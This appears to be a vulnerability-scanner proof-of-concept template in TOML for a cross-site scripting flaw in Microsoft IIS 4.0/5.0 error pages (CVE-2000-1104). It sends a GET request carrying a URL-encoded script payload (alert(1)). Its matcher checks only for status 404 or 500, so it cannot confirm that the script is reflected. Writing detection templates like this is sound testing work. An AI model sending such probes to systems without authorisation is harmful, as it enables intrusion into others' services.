[info]
author = "ave"
description = "Microsoft IIS 4.0/5.0 在处理包含 HTML 标签的 URL 请求时，错误页面未正确转义用户输入，导致跨站脚本攻击。攻击者可构造包含恶意脚本的 URL 诱使受害者访问，在受害者浏览器中执行任意脚本代码。"
id = "POC-AVE-2000-2006"
name = "Microsoft IIS 4.0/5.0 错误消息跨站脚本漏洞 PoC"
severity = "high"
tags = ["ave-2000-2006"]
vuln_id = [
    "CVE-2000-1104",
    "AVE-2000-2006",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%3Cscript%3Ealert(1)%3C/script%3E"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    404,
    500,
]
type = "status"
